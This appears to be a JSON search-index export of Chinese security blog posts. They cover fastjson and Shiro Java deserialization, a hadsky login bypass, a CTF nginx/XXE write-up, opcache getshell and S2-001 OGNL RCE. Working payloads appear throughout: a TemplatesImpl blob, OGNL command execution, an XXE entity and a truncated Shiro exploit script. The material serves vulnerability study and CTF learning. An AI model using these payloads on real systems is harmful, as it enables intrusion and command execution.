bgAAhIDtgAEV7EAAAACAAsAAAAOAAMAAAAKAAQACwANAAwADAAAAAwAAQAAAA4ADQAOAAAADwAAAAQAAQAQAAEAEQASAAIACgAAAD8AAAADAAAAAbEAAAACAAsAAAAGAAEAAAAQAAwAAAAgAAMAAAABAA0ADgAAAAAAAQATABQAAQAAAAEAFQAWAAIADwAAAAQAAQAXAAEAEQAYAAIACgAAAEkAAAAEAAAAAbEAAAACAAsAAAAGAAEAAAAUAAwAAAAqAAQAAAABAA0ADgAAAAAAAQATABQAAQAAAAEAGQAaAAIAAAABABsAHAADAA8AAAAEAAEAFwAJAB0AHgACAAoAAABBAAIAAgAAAAm7AAVZtwAGTLEAAAACAAsAAAAKAAIAAAAXAAgAGAAMAAAAFgACAAAACQAfACAAAAAIAAEAIQAOAAEADwAAAAQAAQAiAAEAIwAAAAIAJA==&quot;],'_name':'a.b','_tfactory':{ },&quot;_outputProperties&quot;:{ },&quot;_name&quot;:&quot;a&quot;,&quot;_version&quot;:&quot;1.0&quot;,&quot;allowedProtocols&quot;:&quot;all&quot;} note lexer的np代表开始位置的偏移量，bp表示结束位置的偏移量，每next一次bp就加一，sp是相较于np而言的偏移量。 参考 fastjson 远程反序列化poc的构造和分析 FastJson 反序列化学习 Fastjson 流程分析及 RCE 分析 FastJson反序列化解析流程 Fastjson反序列化漏洞 1.2.24-1.2.48 Java中Type接口与Class类的区别联系 Type 接口【重要】 秒懂 Java注解类型（@Annotation） fastjson深度源码解析","link":"/2019/10/02/fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E7%A1%AC%E6%A0%B8%E8%B7%9F%E8%B8%AA/"},{"title":"hadsky部分用户任意登录","text":"漏洞利用过程 在注册页面 注册用户 密码为password 其他信息随便填 在登陆框以用户名0e10（万能用户名） 密码password登录 成功登陆 漏洞产生原因 该cms有三种登陆方式 用户UID 邮箱 用户名 代码如下 \\upload\\phpscript\\checklogin.php 第6行 123456789101112131415if (Cnum($_POST['username'])) { //UID登录 $__ud = $_G['TABLE']['USER'] -&gt; getData($_POST['username']); $username = $__ud['username'];} elseif (strpos($_POST['username'], '@')) { //邮箱登录 $__ud = $_G['TABLE']['USER'] -&gt; getData(array('email' =&gt; $_POST['username'])); $username = $__ud['username']} else { //用户名登录 preg_match('/^[\\x{4e00}-\\x{9fa5}A-Za-z0-9_]+$/u', $_POST['username']) ? $username = $_POST['username'] : $username = FALSE; if (strlen($username) &gt; 24 || strlen($username) &lt; 3) { $username = FALSE; }} 这里会首先进入Cnum()函数检查 1234567891011121314151617function Cnum($str, $return = 0, $int = true, $min = FALSE, $max = FALSE) { if (is_numeric($str)) { //0e10在这里进入 if ($int) $str = (int)$str; } else { $str = $return; } if ($min !== FALSE) if ($str &lt; $min) $str = $return; if ($max !== FALSE) if ($str &gt; $max) $str = $return; return $str; //return 0} 这个函数的功能是检验是否位数字,0e10的用户名经过is_numberic()判断returu，最后int()后，以 return 0返回 问题就出在这里 if (Cnum($_POST[‘username’])) 看到返回值是0会认为他不是数字（实际上是的嘛只是科学记数法而已）,于是绕过UID登录方式，0e10显然也不符合邮箱格式，于是进入else被当成了用户名来验证。0e10符合用户名的格式，于是接下来进入用户存在性检验。 \\upload\\phpscript\\checklogin.php 第25行 12if (!$username || !$password) $chkr = '请填入正确的登录信息'; 如果开始直接输入0，会在这里报错，但是0e10不会目测PHP弱类型的原因~ \\upload\\phpscript\\checklogin.php 第34行 12//检验数据库中是否有相应用户名$trylogindata = $_G['TABLE']['USER'] -&gt; getData(array('username' =&gt; $username)); 跟进getData() 123456789public function getData($field = NULL, $str = NULL) { /*省略*/ if (Cnum($field, FALSE)) { $sql = &quot;where `id`={$field}&quot;; } else { $sql = $this -&gt; getSql($field, $str); } $query = mysql_query(&quot;select * from `{$this-&gt;mysql_prefix}{$this-&gt;table}` {$sql}&quot;);}/*省略*/ 跟进getSql() 12345678public function getSql($field, $str = NULL) { /*省略*/ } elseif (is_array($field) &amp;&amp; $str == NULL) { foreach ($field as $key =&gt; $value) { if (Cstr($key, FALSE, TRUE, 1, 255)) $sql .= &quot;`{$key}`=&quot; . mysqlstr($value) . &quot; and &quot;;//无引号保护 }}/*省略*/ 这里mysqlstr($value)没有引号保护直接拼接进去，最终执行SQL语句如下 12if ($trylogindata) { /*$trylogindata为真则进入用户密码检验*/ 由于MYSQL的弱类型的关系（0=任何字符串）因为username字段是是字符串，所以只要数据库里有一条数据，那么getData(array('username' =&gt; $username));就会返回数据给$trylogindata \\upload\\phpscript\\checklogin.php 第52行 12if ($trylogindata) { /*$trylogindata为真则进入用户密码检验*/ 由于$trylogindata存在，所以进入if语句 \\upload\\phpscript\\checklogin.php 第52行 12//检验密码是否正确$userdata = UserLogin(array('username' =&gt; $username, 'password' =&gt; md5($password))); 跟进UserLogin() 1234function UserLogin($chkuserloginarray, $chkloginqx = true) { global $_G; $userdata = $_G['TABLE']['USER'] -&gt; getData($chkuserloginarray); /**省略**/ 这里检验用户名，密码依然是getData()函数 最后执行SQL语句就是 1select * from `pk_user` where `username`=0e10 and password = 'xxxxxxxxx' 所以只要数据库中存在密码，就能登陆拥有相应密码的第一个用户（万能用户名）。 一句话总结：未加引号保护时，MYSQL+PHP弱类型引起的登陆逻辑漏洞 最后 1、厂商原话：系统开源的，也希望大家多多支持，能把发现的问题发给我 2、个人能力有限，如有错误还请师傅们多多指教","link":"/2017/08/17/hadsky%E9%83%A8%E5%88%86%E7%94%A8%E6%88%B7%E4%BB%BB%E6%84%8F%E7%99%BB%E5%BD%95/"},{"title":"linux下java反序列化通杀回显方法的低配版实现","text":"首发于先知转载到自己博客 故事的起因 一直觉得shiro反序列化是一个很舒服的洞，payload原生加密（无特征），实战中有概率遇见并且又是java反序列化洞所以危害又很大。不过尽管这样shiro打起来依然有java反序列化的两个痛点。第一是可用的gadget，第二个带内回显的问题。不过某天在刷tw的时候发现第二个痛点国内已经有大佬有成熟解决方案了。 注意看图，shiro的回显并不在http响应包中而是在http响应包之前，很玄学的回显对吧？联想最近在看了一篇文章通杀漏洞利用回显方法-linux平台，按我的理解这篇文章的思路大致是通过java反序列化执行代码&amp;&amp;系统命令获取到发起这次请求时服务端socket的文件描述符，然后在文件描述符写入回显内容。上图的回显效果和这种思路非常相似。 技术的难点 实现这种技术的难点在于如何通过java反序列化执行代码&amp;&amp;系统命令获取本次http请求用到socket的文件描述符。因为在服务器对外开放的时会有fd下会有许多socket描述符。 这里给出获取socket文件描述符我的一个低配版思路及实现，至于为啥是低配版会在文章最后提到。首先注意到socket后面的数字不同，这个数字实际上是inode号。这个inode号也出现在/proc/net/tcp中。 注意到每一个inode号对应唯一条tcp连接信息并且这条信息中的remote_address项记录了远程连接的ip和端口号。说到这里其实获取socket思路就很明显了：通过指定客户端发起请求的源端口号，通过cat grep awk组合大法在tcp表中拿到inode，把拿到的inode号再去fd目录下再用cat grep wak大法拿到文件描述符的数字，再调用java代码打开文件描述符即可实现带内回显。 实现细节 指定端口号 requests库可以重新实现Http达到指定请求端口的目的。 1234567891011121314class SourcePortAdapter(HTTPAdapter): &quot;&quot;&quot;&quot;Transport adapter&quot; that allows us to set the source port.&quot;&quot;&quot; def __init__(self, port, *args, **kwargs): self._source_port = port super(SourcePortAdapter, self).__init__(*args, **kwargs) def init_poolmanager(self, connections, maxsize, block=False): self.poolmanager = PoolManager( num_pools=connections, maxsize=maxsize, block=block, source_address=('', self._source_port))s = requests.Session()s.mount(target, SourcePortAdapter(randNum))resp = s.get(target, cookies={'rememberMe': base64_ciphertext.decode()}, timeout=5, headers=headers, verify=False) 获取socket对应的文件描述符 整个流程使用的命令如下 123a=`cat /proc/$PPID/net/tcp6|awk '{if($10&gt;0)print}'|grep -i %s|awk '{print $10}'`;b=`ls -l /proc/$PPID/fd|grep $a|awk '{print $9}'`;echo -n $b 往文件描述中写数据 现在假设shiro存在反序列化并且所用gadget的末端是走的TemplatesImpl，那么我们可以把ysoserial中的硬编码的命令执行改成下面这样的代码执行。 1234567891011121314151617181920212223242526272829303132String[] cmd = { &quot;/bin/sh&quot;, &quot;-c&quot;, &quot;a=`cat /proc/$PPID/net/tcp6|awk '{if($10&gt;0)print}'|grep -i %s|awk '{print $10}'`;b=`ls -l /proc/$PPID/fd|grep $a|awk '{print $9}'`;echo -n $b&quot;};java.io.InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();java.io.InputStreamReader isr = new java.io.InputStreamReader(in);java.io.BufferedReader br = new java.io.BufferedReader(isr);StringBuilder stringBuilder = new StringBuilder();String line;while ((line = br.readLine()) != null){ stringBuilder.append(line);}int num = Integer.valueOf(stringBuilder.toString()).intValue();cmd = new String[]{&quot;/bin/sh&quot;,&quot;-c&quot;,&quot;ifconfig&quot;};in = Runtime.getRuntime().exec(cmd).getInputStream();isr = new java.io.InputStreamReader(in);br = new java.io.BufferedReader(isr);stringBuilder = new StringBuilder();while ((line = br.readLine()) != null){ stringBuilder.append(line);}String ret = stringBuilder.toString();java.lang.reflect.Constructor c=java.io.FileDescriptor.class.getDeclaredConstructor(new Class[]{Integer.TYPE});c.setAccessible(true);java.io.FileOutputStream os = new java.io.FileOutputStream((java.io.FileDescriptor)c.newInstance(new Object[]{new Integer(num)}));os.write(ret.getBytes());os.close(); 我这种低配版指令ifconfig后效果实现效果如下，服务端会直接返回数据并断掉连接，所以没有了后面http响应包，requests库无法识别返回的内容报错。 总结 我这种方法因为需要保证请求源端口，所以没办法按照图中师傅实现的一样在burp中（burp代理后发起请求的端口不可控）。同样的道理如果脆弱的shiro应用在反代后面，因为反代的源端口不可预测所以没办法用这种低配版方案拿到回显。但实际情况不出网的shiro肯定是在内网里面的，所以从这角度想想还有点鸡肋，就当抛砖引玉了～ 在上面引用的文章中提到了 “jvm所有的对象都存储在堆内存中，也许可以通过某种方法直接获取存储在堆内存中的socket对象实现回显”，我猜可以在burp里面利用的情况应该是通过某种黑魔法获取到了本次请求的socket对象了（或者是更底层的方法）所以才不要以客户端源口作为过滤条件。 写到这忽然想起，那个图片payload貌似没有打码，或许把payload用shiro常见的密钥撞一下撞可以看到标准版思路的片段？体力不够，溜了。 研究这个问题时候也请教了相关的大哥接收到了一些提示，因为属于他人知识产权，文章并未提及。在此谢过指点我的大哥们。","link":"/2020/02/24/linux%E4%B8%8Bjava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%9A%E6%9D%80%E5%9B%9E%E6%98%BE%E6%96%B9%E6%B3%95%E7%9A%84%E4%BD%8E%E9%85%8D%E7%89%88%E5%AE%9E%E7%8E%B0/"},{"title":"nginx的秘密wp","text":"第一步，web缓存漏洞 完成一步需三个点结合。 第一点： 观察到static有存在目录穿越漏洞，虽然没开autoindex但依然可以通过/static../etc/passwd下载文件。结合提示从nginx的配置开始，可以想到下载nginx.conf，下载的路径是默认的nginx安装路径/static../etc/nginx/nginx.conf。可以看到nginx配置，diff一下可以看到关键点在 123456789101112131415161718192021222324proxy_cache_path /tmp/mycache levels=1:2 keys_zone=my_cache:10m max_size=10g inactive=30s use_temp_path=off; limit_conn_zone $binary_remote_addr zone=conn:10m; limit_req_zone $binary_remote_addr zone=allips:10m rate=2r/s; server { listen 4455 default_server; server_name localhost; location /static { alias /home/; } location ~* \\.(css|js|gif|png){ proxy_cache my_cache; proxy_cache_valid 200 30s; proxy_pass http://bugweb.app:8000; proxy_set_header Host $host:$server_port; proxy_ignore_headers Expires Cache-Control Set-Cookie; } location / { limit_conn conn 20; proxy_pass http://bugweb.app:8000; proxy_set_header Host $host:$server_port; } } 第二点 通过一些方法发现路由映射和些小问题。例如在扫描目录的时候可以发现这些。 登陆后访问发现，这些路由都是访问的edit页面，随便测editxxx发现也映射到相同的页面。猜测后台路由的逻辑是只要访问的是以edit开头都相当于访问edit。 第三点： 有一个post_bug，这个点的功能是给提交bug给管理员，管理员会点击查看。有一个write_plan可以写一些东西，其他人看不见。如果你访问过/user/admin还会发现一个小tip管理员说自己已经把所有密码写在秘密计划里面了。 三个点结合起来可以触发web缓存漏洞。发送http://xxxxx/write_plan/23333.png后立即访问就可以看到管理员的秘密计划。 看到的东西如下 拿到内网ftp服务器的账号密码。 syc10ver Eec5TN9fruOOTp2G 。 第二步，xxe的两个协议 如果有师傅把第一步做出来了，相信下面的操作也很简单了。虽然题目提示给的是从nginx开始，但是我总是感觉很多师傅第一个找到的漏洞点是xxe。触发点在上传计划那里，xml文件中的外部实体可以被解析。 之所以要多出一步，是我觉得有两个tip还是有些师傅没（强）有（行）关（增）注（加）到（难度）。 url的完整的形式是scheme:[//[user[:password]@]host[:port]][/path][?query][#fragment] proc伪文件中有arp信息 我这里用的解析xml的python库加载外部实体的时候用的是urlopen，如果没记错的话只支持ftp，http，file。上传 读目录，把两个ip都试试 12345678&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE person [&lt;!ENTITY remote SYSTEM&quot;ftp://syc10ver:Eec5TN9fruOOTp2G@172.18.0.2/&quot;&gt;]&gt;&lt;plans&gt; &lt;plan&gt; &lt;content&gt;payload &amp;remote;&lt;/content&gt; &lt;/plan&gt;&lt;/plans&gt; 读flag 最后get flag","link":"/2018/06/26/nginx%E7%9A%84%E7%A7%98%E5%AF%86wp/"},{"title":"opcache缓存getshell","text":"opcache是啥 opencache是一种php7自带的缓存引擎，它将编译过一遍的的php脚本以字节码文件的形式缓存在特定目录中（在php.ini中指定）。这样节省了每次访问同一脚本都要加载和解析的时间开销。（先检查有没有bin文件有就直接用） 动手配置 在php.ini，打开有关opcache的选项（即保持默认），然后修改以下两项。 12opcache.file_cache_only = 1 #默认是0，设置为1后强制所有缓存以文件形式存在，否则可能缓存可能会存在于内存中opcache.file_cache = /tmp/cache #默认为空，这个目录php不会帮我们创建，一定要自己手动创建 缓存路径 简单的举个栗子，比如我们访问/var/www/html/index.php，那么字节缓存的路径是/tmp/cache/[system_id]/var/www/html/index.php.bin。其中system_id，由php veriosn，Zend Extension Build，System（系统架构）三部分决定。这三样的东西都可以在phpinfo找到。具体的自动化生成脚本可以在github的这个项目中找到。在下文中把字节码文件简称问bin文件，把与之对应的php文件简称为源文件。 利用方法 正如上面提到的，在opcache机制下，有bin文件会直接执行bin文件，那么如果配合上传漏洞这一类漏洞是不是达到将bin写到指定目录，然后访问相应的php文件达到隐蔽getshell的目的？ 利用的限制 根据前面的描述，我们可以总结如下的限制条件 opcache要打开(php7自带但默认不打开) opcache.file_cache_only = 1 知道systemid，opcache缓存目录 类文件上传漏洞 知道bin文件所对应php的时间戳（一个秒级时间戳，这点稍后会解释） 前三点可以通过phpinfo直接或计算得知，重点说说第五点，在phpinfo中有个叫opcache.validate_timestamps的配置它默认为1，这应该是为安全性而考虑的，在bin文件在创建时会在文件内容中写入一个时间戳，这个时间戳跟源文件一样，在执行bin文件之前php会检查时间戳是否一致，如果不一致则丢弃重新创建bin文件。个人认为第五点是最苛刻的因为在cms闭源的情况下几乎不可猜。 bin文件结构分析 依然在刚才给出的链接中下载分析模板，并在010editor中导入，不要用010editor自带的分析模板有坑。用红色框标注的地方就是和目标服务器不一样需要修改的地方，原谅我啰嗦一遍，这三个框分别代表system_id, 时间戳，路径。 实验验证 kali phpinfo.php ubuntu phpinfo.php 拿到kali的phpinfo bin文件 修改时间戳 system_id 复制ubuntu相应文件中然后重新访问 CTF中 这次在0ctf遇到了这种攻击方式，代码是这样的 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172&lt;?phperror_reporting(E_ALL);$dir = 'sandbox/' . sha1($_SERVER['REMOTE_ADDR']) . '/';if(!file_exists($dir)){ mkdir($dir);}if(!file_exists($dir . &quot;index.php&quot;)){ touch($dir . &quot;index.php&quot;);}function clear($dir){//如果不是目录就删除 if(!is_dir($dir)){ unlink($dir); return; }//删除非. ..的文件 foreach (scandir($dir) as $file) { if (in_array($file, [&quot;.&quot;, &quot;..&quot;])) { continue; } unlink($dir . $file); }//删除目录 rmdir($dir);}switch ($_GET[&quot;action&quot;] ?? &quot;&quot;) { case 'pwd': echo $dir; break; case 'phpinfo': echo file_get_contents(&quot;phpinfo.txt&quot;); break; case 'reset': clear($dir); break; case 'time': echo time(); break; case 'upload': if (!isset($_GET[&quot;name&quot;]) || !isset($_FILES['file'])) { break; } echo &quot;go in to upload&quot;; if ($_FILES['file']['size'] &gt; 100000) { clear($dir); break; } $name = $dir . $_GET[&quot;name&quot;]; if (preg_match(&quot;/[^a-zA-Z0-9.\\/]/&quot;, $name) || stristr(pathinfo($name)[&quot;extension&quot;], &quot;h&quot;)) { break; } echo &quot;go in to move&quot;; var_dump($name); move_uploaded_file($_FILES['file']['tmp_name'], $name); $size = 0; foreach (scandir($dir) as $file) { if (in_array($file, [&quot;.&quot;, &quot;..&quot;])) { continue; } $size += filesize($dir . $file); } if ($size &gt; 100000) { clear($dir); } break; case 'shell': ini_set(&quot;open_basedir&quot;, &quot;/var/www/html/$dir:/var/www/html/flag&quot;); include $dir . &quot;index.php&quot;; break; default: highlight_file(__FILE__); break;} ?action=phpinfo可以得到system_id 7.0.28API3 151012,NTSBIN_SIZEOF_CHAR48888 -&gt; 7badddeddbd076fe8352e80d8ddf3e73 ?action=pwd 拿到自己路径sandbox/053b454d2e71b6a9b78f7a8c3d27e527703d3e44/ 结合上面的两个进一步推断出缓存路径/tmp/cache/7badddeddbd076fe8352e80d8ddf3e73/var/www/html/sandbox/053b454d2e71b6a9b78f7a8c3d27e527703d3e44/index.php 在自己本地环境中建立sandbox/053b454d2e71b6a9b78f7a8c3d27e527703d3e44/index.php并写上自己的payload,**切记这一点当时没有做出来就是本地没有建立一模一样的路径。**目测都有ban函数，所以就纯写了一点东西，验证线上是否能输出。 然后测试了glob，发现没有结果最后用 读到目录，然后用之前给的代码中已经使用的high_light读文件（肯定不会被ban） 123&lt;?phphighlight_file(&quot;/var/wwwml/flag/93f4c28c0cf0b07dfd7012dca2cb868cc0228cad&quot;);?&gt; 读出来又是是一个bin文件，不会逆。。。","link":"/2018/04/08/opcache%E7%BC%93%E5%AD%98getshell/"},{"title":"s2-001 代码分析","text":"环境搭建 pom.xml中加入 12345&lt;dependency&gt; &lt;groupId&gt;org.apache.struts&lt;/groupId&gt; &lt;artifactId&gt;struts2-core&lt;/artifactId&gt; &lt;version&gt;2.0.8&lt;/version&gt;&lt;/dependency&gt; index.jsp 12345678910111213141516171819&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=UTF-8&quot; pageEncoding=&quot;UTF-8&quot;%&gt;&lt;%@ taglib prefix=&quot;s&quot; uri=&quot;/struts-tags&quot; %&gt;&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot; &quot;http://www.w3.org/TR/html4/loose.dtd&quot;&gt;&lt;html&gt;&lt;head&gt; &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt; &lt;title&gt;S2-001&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h2&gt;S2-001 Demo&lt;/h2&gt;&lt;p&gt;link: &lt;a href=&quot;https://cwiki.apache.org/confluence/display/WW/S2-001&quot;&gt;https://cwiki.apache.org/confluence/display/WW/S2-001&lt;/a&gt;&lt;/p&gt;&lt;s:form action=&quot;login&quot;&gt; &lt;s:textfield name=&quot;username&quot; label=&quot;username&quot; /&gt; &lt;s:textfield name=&quot;password&quot; label=&quot;password&quot; /&gt; &lt;s:submit&gt;&lt;/s:submit&gt;&lt;/s:form&gt;&lt;/body&gt;&lt;/html&gt; welcome.jsp 12345678910111213&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=UTF-8&quot; pageEncoding=&quot;UTF-8&quot;%&gt;&lt;%@ taglib prefix=&quot;s&quot; uri=&quot;/struts-tags&quot; %&gt;&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot; &quot;http://www.w3.org/TR/html4/loose.dtd&quot;&gt;&lt;html&gt;&lt;head&gt; &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt; &lt;title&gt;S2-001&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;p&gt;Hello &lt;s:property value=&quot;username&quot;&gt;&lt;/s:property&gt;&lt;/p&gt;&lt;/body&gt;&lt;/html&gt; struts.xml 12345678910111213&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;!DOCTYPE struts PUBLIC &quot;-//Apache Software Foundation//DTD Struts Configuration 2.0//EN&quot; &quot;http://struts.apache.org/dtds/struts-2.0.dtd&quot;&gt;&lt;struts&gt; &lt;package name=&quot;s2-001&quot; extends=&quot;struts-default&quot;&gt; &lt;action name=&quot;login&quot; class=&quot;com.example.s2001.LoginAction&quot;&gt; &lt;result name=&quot;success&quot;&gt;welcome.jsp&lt;/result&gt; &lt;result name=&quot;error&quot;&gt;index.jsp&lt;/result&gt; &lt;/action&gt; &lt;/package&gt;&lt;/struts&gt; web.xml 12345678910111213141516171819&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;web-app xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns=&quot;http://xmlns.jcp.org/xml/ns/javaee&quot; xsi:schemaLocation=&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd&quot; id=&quot;WebApp_ID&quot; version=&quot;3.1&quot;&gt; &lt;filter&gt; &lt;filter-name&gt;struts2&lt;/filter-name&gt; &lt;filter-class&gt;org.apache.struts2.dispatcher.FilterDispatcher&lt;/filter-class&gt; &lt;/filter&gt; &lt;filter-mapping&gt; &lt;filter-name&gt;struts2&lt;/filter-name&gt; &lt;url-pattern&gt;/*&lt;/url-pattern&gt; &lt;/filter-mapping&gt; &lt;welcome-file-list&gt; &lt;welcome-file&gt;index.jsp&lt;/welcome-file&gt; &lt;/welcome-file-list&gt;&lt;/web-app&gt; LoginAction.java 1234567891011121314151617181920212223242526272829303132333435package com.example.s2001;import com.opensymphony.xwork2.ActionSupport;public class LoginAction extends ActionSupport { private String username = null; private String password = null; public String getUsername() { return this.username; } public String getPassword() { return this.password; } public void setUsername(String username) { this.username = username; } public void setPassword(String password) { this.password = password; } public String execute() throws Exception { if ((this.username.isEmpty()) || (this.password.isEmpty())) { return &quot;error&quot;; } if ((this.username.equalsIgnoreCase(&quot;admin&quot;)) &amp;&amp; (this.password.equals(&quot;admin&quot;))) { return &quot;success&quot;; } return &quot;error&quot;; }} 访问 http://localhost:8888/s2_001_war_exploded/ 漏洞复现 username 随便填，password填poc，注意需要url编码 123456789101112%{ #a=(new java.lang.ProcessBuilder(new java.lang.String[]{&quot;pwd&quot;})).redirectErrorStream(true).start(), #b=#a.getInputStream(), #c=new java.io.InputStreamReader(#b), #d=new java.io.BufferedReader(#c), #e=new char[50000], #d.read(#e), #f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;), #f.getWriter().println(new java.lang.String(#e)), #f.getWriter().flush(), #f.getWriter().close()} 效果如下 预备知识-OGNL s2的很多rce洞都是提交的ognl表达式被服务端解析执行而造成，有必要在之前先作一定的了解。 介绍 OGNL全称是对象视图导航语言（Object-Graph Navigation Language），它是一种功能强大的表达式语言，通过它简单一致的表达式语法，可以存取对象的任意属性，调用对象的方法，遍历整个对象的结构图，实现字段类型转化等功能。它使用相同的表达式去存取对象的属性。 OGNL 的使用 传统的OGNL可以放一个Object到root，放一个Map到values（很多文章都叫它Context）。 获取root、Context的值或执行其内部方法的方式都差不多，唯一的区别就是获取Context下的信息时需要加前缀#key或@key(静态变量，静态方法)，看下面例子。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485package com.example.ognltest;import ognl.Ognl;import ognl.OgnlContext;import ognl.OgnlException;import java.util.HashMap;import java.util.Map;public class OgnlTest { public static void main(String[] args) throws OgnlException { User.fun1(); }}class User { private String name; public String getName() { return name; } public void setName(String name) { this.name = name; } public User(String name) { this.name = name; } public static void fun1() throws OgnlException { //准备root User u1 = new User(&quot;user1&quot;); //准备context Map&lt;String,User&gt; context = new HashMap&lt;String,User&gt;(); context.put(&quot;key&quot;, new User(&quot;user2&quot;)); //设置root和context OgnlContext ognl = new OgnlContext(); ognl.setRoot(u1); ognl.setValues(context); //取出root中的数据，直接写属性名 String rootname = (String) Ognl.getValue(&quot;name&quot;, ognl, ognl.getRoot()); System.out.println(rootname); //取出context中的属性值 //#代表从context中取值 String contextname = (String) Ognl.getValue(&quot;#key.name&quot;, ognl, ognl.getRoot()); System.out.println(contextname); //修改root中数据 Ognl.getValue(&quot;name = 'user3'&quot;, ognl, ognl.getRoot()); rootname = (String) Ognl.getValue(&quot;name&quot;, ognl, ognl.getRoot()); System.out.println(rootname); //修改context中数据 Ognl.getValue(&quot;#key.name = 'user4'&quot;, ognl, ognl.getRoot()); contextname = (String) Ognl.getValue(&quot;#key.name&quot;, ognl, ognl.getRoot()); System.out.println(contextname); //调用root中方法 Ognl.getValue(&quot;setName('user5')&quot;, ognl, ognl.getRoot()); rootname = (String)Ognl.getValue(&quot;whoami()&quot;, ognl, ognl.getRoot()); System.out.println(rootname); //调用context中方法 Ognl.getValue(&quot;#key.setName('user6')&quot;, ognl, ognl.getRoot()); contextname = (String)Ognl.getValue(&quot;#key.whoami()&quot;, ognl, ognl.getRoot()); System.out.println(contextname); //调用静态方法 String funcreturnvalue = (String) Ognl.getValue(&quot;@com.example.ognltest.User@func2()&quot;, ognl, ognl.getRoot()); System.out.println(funcreturnvalue); //调用静态属性 Double pi = (Double) Ognl.getValue(&quot;@java.lang.Math@PI&quot;, ognl, ognl.getRoot()); System.out.println(pi); } public String whoami(){ return &quot;I'm &quot; + this.name; } public static String func2(){ return &quot;Call static method func2&quot;; }} 输入结果 12345678user1user2user3user4I'm user5I'm user6Call static method func23.141592653589793 struts2中的OGNL 在Struts2 中有个值栈对象即ValueStack。而说得通俗些，这个值栈就是OgnlContext。ValueStack内部封装了一个CompoundRoot类型的对象作为root属性，CompoundRoot是一个继承ArrayList的栈存储结构。而所有被压入栈中的对象，都会被视为OGNL的Root对象。在使用OGNL计算表达式时，首先会将栈顶元素作为Root对象，进行表达式匹配，匹配不成功则会依次向下匹配，最后返回第一个成功匹配的表达式计算结果。因此，Struts2通过ValueStack实现了多Root对象的OGNL操作。 当你提交一个请求，会为这个请求创建一个和web容器交互的ActionContext，与此同时会创建ValueStack，并置于ActionContext之中。而实例化Action之后，就会将这个action对象压入ValueStack中。在请求“映射”过程中，Struts2则是通过ParametersInterceptor拦截器将提交的参数值封装入对应的Action属性中。因此action实例可以作为OGNL的Root对象，对于Action中的属性、方法都可以使用OGNL来获取。 代码分析 首先是下断点的位置，在自己尝试调试之前，读取了一些前人的文章，他们的断点的位置大部分都在 com/opensymphony/xwork2/interceptor/ParametersInterceptor.class的doIntercept方法上面。 琢磨了一下断点打在ParametersInterceptor拦截器这里的好处 不用调试tomcat自身的代码，这里下断点已是tomcat已经把“控制权”移交给strust之后了。 拦截器只能对action请求起作用，而过滤器则可以对几乎所有的请求起作用（一开始想的是在web.xml中配置的struts2过滤器org.apache.struts2.dispatcher.FilterDispatcher处打断点） ParametersInterceptor是拦截器，在这里下断点刚好是在执行业务逻辑之前，并且ParametersInterceptor是struts2的缺省会用到的拦截器之一。 ParametersInterceptor拦截器的作用是把传来的参数赋值给POJO，所以这里是payload“入侵”的起点。 xx 接下来会进行很多tomcat的内部操作，这里单步跟进IDEA会找不到相应的代码，一开始卡这了，后来看了别人的文章也遇到过这种情况。 文章提到多次步入，复现的时候一直至少跟了几十次步入也没跟到文章所述位置，估计实际搞要点几百次吧，直接定位到rg.apache.struts2.views.jsp.ComponentTagSupport下断点跳了。 可以看出来这里实际上是解析jsp模版了，先解析的是jsp中username框，后解析的是password框，我们是从password传入的payload所以第一次先跳过。 最终触发点是在doEndTag时的操作，仔细看看 eveluateParams处理传入的参数 默认支持altSyntax，所以会把pssword变成%{password}当ogln表达式解析。（struts.tag.altSyntax 该属性指定是否允许在Struts 2标签中使用表达式语法,因为通常都需要在标签中使用表达式语法,故此属性应该设置为true,该属性的默认值是true） 跟入addParameter时的findValue 问题处在while True + Stack.findValue造成了对ogln的递归解析 第一次，提取出%{password}内容即payload 第二次，把提出来的payload再次当ognl表达式执行，触发RCE 参考 从零开始学习Struts2 S2-001 【Struts2-命令-代码执行漏洞分析系列】S2-001 IDEA中创建maven项目没有java和resources子文件的解决 OGNL Struts2学习之OGNL表达式 JSP九大内置对象分析 S2-001调试分析","link":"/2019/10/09/s2-001%20%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/"},{"title":"shiro 反序列化复现","text":"利用环境搭建 12docker pull medicean/vulapps:s_shiro_1docker run -d -p 80:8080 medicean/vulapps:s_shiro_1 漏洞利用条件 只要rememberMe的AES加密密钥泄露，无论shiro是什么版本都会导致反序列化漏洞。 漏洞利用 1234567891011121314151617181920212223242526272829303132333435363738394041424344import osimport reimport base64import uuidimport subprocessimport requestsfrom Crypto.Cipher import AESJAR_FILE = '/Users/Viarus/Downloads/ysoserial/target/ysoserial-0.0.6-SNAPSHOT-all.jar'def poc(url, rce_command): if '://' not in url: target = 'https://%s' % url if ':443' in url else 'http://%s' % url else: target = url try: payload = generator(rce_command, JAR_FILE) # 生成payload r = requests.get(target, cookies={'rememberMe': payload.decode()}, timeout=10) # 发送验证请求 print r.text except Exception, e: pass return Falsedef generator(command, fp): if not os.path.exists(fp): raise Exception('jar file not found!') popen = subprocess.Popen(['java', '-jar', fp, 